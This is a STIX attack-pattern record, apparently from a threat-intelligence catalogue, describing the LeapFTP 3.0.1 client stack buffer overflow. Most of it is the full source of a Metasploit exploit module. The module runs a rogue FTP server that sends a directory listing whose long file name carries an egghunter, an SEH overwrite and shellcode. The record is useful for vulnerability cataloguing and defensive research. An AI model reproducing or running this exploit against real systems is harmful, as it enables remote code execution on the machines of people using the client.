{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a971858-fe82-41dc-80e6-710b16e0d30c",
    "created": "2024-08-14T16:51:08.418291Z",
    "modified": "2024-08-14T16:51:08.418295Z",
    "name": "LeapFTP 3.0.1 Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the LeapFTP 3.0.1 client. This issue is triggered when a file with a long name is downloaded/opened. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/leapftp_list_reply.rb",
            "external_id": "leapftp_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::FtpServer\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LeapFTP 3.0.1 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the LeapFTP 3.0.1 client.\n        This issue is triggered when a file with a long name is downloaded/opened.\n      },\n      'Author' \t =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>',  # Original bug, completed MSF module\n          'nullthreat'     # Ported PoC to MSF\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '68640'],\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Offset' => 528,'Ret' => 0x0042A8A8 } ], # ADD ESP,64, POP EBX, RET :) boy I love pvefindaddr\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n  end\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n      conn = establish_data_connection(c)\n      if(not conn)\n        c.put(\"425 Can't build data connection\\r\\n\")\n        return\n      end\n      print_status(\" - Data connection set up\")\n      code = 150\n      c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n      code = 226\n      c.put(\"#{code} Directory send ok.\\r\\n\")\n      # create the egg hunter\n      badchars = \"\"\n      eggoptions =\n      {\n      :checksum => true,\n      :eggtag => \"W00T\"\n      }\n      hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)\n      # Get the file ready\n      junk = \"\\x73\\x65\"  #73 65 = jump over filename = \"se\"\n      junk << \"cret admin passwords.txt\"\n      junk << \"_\" * ((target['Offset'])-junk.length-hunter.length) # _ = POP EDI\n      junk << hunter\n      seh = [target.ret].pack('V')\n      shellcode = egg + egg + payload.encoded\n      junk2 = rand_text_alpha((2000 - shellcode.length))\n      payload = junk + seh + shellcode + junk2\n      strfile = payload\n      print_status(\" - Sending directory list via data connection\")\n      dirlist = \"-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{strfile}.txt\\r\\n\"\n      conn.put(\"total 2\\r\\n\"+dirlist)\n      conn.close\n      return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}